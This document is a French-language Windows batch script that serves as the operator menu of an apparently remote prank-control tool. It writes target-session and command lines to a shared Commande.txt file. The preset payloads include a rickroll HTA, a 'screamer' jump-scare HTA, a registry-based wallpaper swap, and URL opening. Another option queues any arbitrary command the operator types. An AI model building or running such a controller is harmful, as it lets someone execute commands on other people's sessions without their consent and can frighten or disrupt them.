@echo off
chcp 65001 > nul
setlocal enabledelayedexpansion
set pathc="C:\Users\faniz\Downloads\yo\VARTXT\Commande.txt"
rem 
set "colorCode=%1"
if not defined colorCode set "colorCode=f3"

:menu
cls
color %colorCode%


for /f "delims=" %%a in ('"prompt $H & for %%b in (1) do rem"') do set "BS=%%a"
set "width=0"
for /l %%a in (1,1,120) do (
    set /a "width += 1"
    set "line=!line!!BS!"
)


set /a "indent=(width-13)/2"
set "spaces="
for /l %%a in (1,1,%indent%) do set "spaces=!spaces! "

echo ----------------------------------------------
echo               Menu Principal
echo ----------------------------------------------
echo          1. Commande Prédéfinie
echo    2. Saisir une Commande Personnalisée
echo               3. Quitter
echo ----------------------------------------------
echo.

set /p choice=Choisissez une option: 
echo.
if "%choice%"=="1" (
    call :executeCommand
) else if "%choice%"=="2" (
    call :enterCustomCommand
) else if "%choice%"=="3" (
    exit /b 0
) else (
    color %colorCode%
    echo.
    echo Choix non valide. Veuillez choisir une option valide.
    echo.
    timeout /nobreak /t 2 >nul
    goto menu
)

:executeCommand
color %colorCode%
echo.
echo Choisissez une commande :
echo  1. Bubbles
echo  2. rickroll
echo  3. Screamer
echo  4. BackgroundSwapper
echo  5. Ouvrire page Web
echo.
set /p predefinedChoice=Choisissez une option: 
echo. > "%pathc%"
if "%predefinedChoice%"=="1" (
    call:bubbles
) else if "%predefinedChoice%"=="2" (
    call:rickroll
) else if "%predefinedChoice%"=="3" (
    call:Screamer
) else if "%predefinedChoice%"=="4" (
    call:changebackground
) else if "%predefinedChoice%"=="5" (
    call:openurl
) else (
    color %colorCode%
    echo.
    echo Aucune commande saisie.
    echo.
    color %colorCode%
)
pause
goto menu

:bubbles
echo. > "%pathc%"
set customCommand=bubbles.scr /p65552
echo.
set /p sessionName=Entrez le nom de la session :
echo.
echo trg:%sessionName%>>"%pathc%"
echo cmd:%customCommand%>>"%pathc%"
set /p command=<"%pathc%"
color %colorCode%
echo.
echo   ---Commande Bubbles "%customCommand%" écrite dans le fichier "%pathc%" pour la session "%sessionName%".---
echo.
echo   ---Pour obtenir le meilleur rendu, un délai de 1 à 10 secondes est requis avant d'activer la commande "%customCommand%" pour la session "%sessionName%".---
echo.
color %colorCode%
pause
goto menu

:rickroll
echo. > "%pathc%"
set customCommand="mshta.exe C:\Users\faniz\Downloads\yo\HTML\rickroll.hta"
echo.
set /p sessionName=Entrez le nom de la session :
echo.
echo trg:%sessionName%>>"%pathc%"
echo cmd:%customCommand%>>"%pathc%"
set /p command=<"%pathc%"
color %colorCode%
echo.
echo   ---Commande pourchanger le background "%customCommand%" écrite dans le fichier "%pathc%" pour la session "%sessionName%".---
echo.
echo   ---Pour obtenir le meilleur rendu, un délai de 1 à 10 secondes est requis avant d'activer la commande "%customCommand%" pour la session "%sessionName%".---
echo.
color %colorCode%
pause
goto menu

:Screamer
echo. > "%pathc%"
echo.
set /p sessionName=Entrez le nom de la session :
echo.
set customCommand="mshta.exe C:\Users\faniz\Downloads\yo\HTML\screamer.hta"
echo trg:%sessionName%>>"%pathc%"
echo cmd:%customCommand%>>"%pathc%"
set /p command=<"%pathc%"
color %colorCode%
echo.
echo   ---Commande Bubbles "%customCommand%" écrite dans le fichier "%pathc%" pour la session "%sessionName%".---
echo.
echo   ---Pour obtenir le meilleur rendu, un délai de 1 à 10 secondes est requis avant d'activer la commande "%customCommand%" pour la session "%sessionName%".---
echo.
color %colorCode%
pause
goto menu


:changebackground
echo. > "%pathc%"
echo.
set /p sessionName=Entrez le nom de la session :
echo.
set /p PathImage=Entrez le chemins de l'image:
echo.
set customCommand=reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%PathImage%" /f && rundll32.exe user32.dll, UpdatePerUserSystemParameters
echo trg:%sessionName%>>"%pathc%"
echo cmd:%customCommand%>>"%pathc%"
set /p command=<"%pathc%"
color %colorCode%
echo.
echo   ---Commande TurnScreen "%customCommand%" écrite dans le fichier "%pathc%" pour la session "%sessionName%".---
echo.
echo   ---Pour obtenir le meilleur rendu, un délai de 1 à 10 secondes est requis avant d'activer la commande "%customCommand%" pour la session "%sessionName%".---
echo.
color %colorCode%
pause
goto menu

:openurl
echo. > "%pathc%"
echo.
set /p sessionName=Entrez le nom de la session :
echo.
set /p URL=Entrez l'url de la page:
set customCommand="start %URL%"
echo trg:%sessionName%>>"%pathc%"
echo cmd:%customCommand%>>"%pathc%"
set /p command=<"%pathc%"
color %colorCode%
echo.
echo   ---Commande Bubbles "%customCommand%" écrite dans le fichier "%pathc%" pour la session "%sessionName%".---
echo.
echo   ---Pour obtenir le meilleur rendu, un délai de 1 à 10 secondes est requis avant d'activer la commande "%customCommand%" pour la session "%sessionName%".---
echo.
color %colorCode%
pause
goto menu



:enterCustomCommand
echo. > "%pathc%"

set /p sessionName=Entrez le nom de la session :
echo.
set /p customCommand=Entrez votre commande personnalisée: 
echo.
if not "%customCommand%"=="" (
    echo trg:%sessionName%>>"%pathc%"
    echo cmd:%customCommand%>>"%pathc%"
    set /p command=<"%pathc%"
    color %colorCode%
    echo.
    echo   ---Commande personnalisée "%customCommand%" écrite dans le fichier "%pathc%" pour la session "%sessionName%".---
    echo.
    echo   ---Pour obtenir le meilleur rendu, un délai de 1 à 10 secondes est requis avant d'activer la commande "%customCommand%" pour la session "%sessionName%".---
    echo.
    color %colorCode%
) else (
    color %colorCode%
    echo.
    echo Aucune commande saisie.
    echo.
    color %colorCode%
)
pause
goto menu
